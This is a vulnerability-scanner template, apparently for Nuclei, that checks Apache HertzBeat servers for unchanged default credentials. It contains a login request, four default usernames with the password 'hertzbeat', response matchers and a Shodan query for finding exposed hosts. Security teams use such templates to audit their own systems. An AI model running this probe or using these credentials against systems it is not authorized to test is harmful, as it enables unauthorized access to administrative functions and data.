id: apache-hertzbeat-default-login

info:
  name: Apache HertzBeat 默认凭据（弱口令）
  author: securitytaters,icarot
  severity: high
  description: |
    该模板通过尝试 Apache HertzBeat 的默认凭据，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统并访问相应管理功能或业务数据。
  reference:
    - https://github.com/apache/hertzbeat
  metadata:
    max-request: 4
    verified: true
    shodan-query: title:"HertzBeat"
  tags: apache,hertzbeat,default-login,vuln

variables:
  password: hertzbeat

http:
  - raw:
      - |
        POST /api/account/auth/form HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"type":0,"identifier":"{{username}}","credential":"{{password}}"}

    attack: pitchfork
    payloads:
      username:
        - admin
        - tom
        - guest
        - lili

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"token":'
          - '{"data":{'
          - 'role":'
        condition: and

      - type: word
        part: content_type
        words:
          - 'application/json'

      - type: status
        status:
          - 200
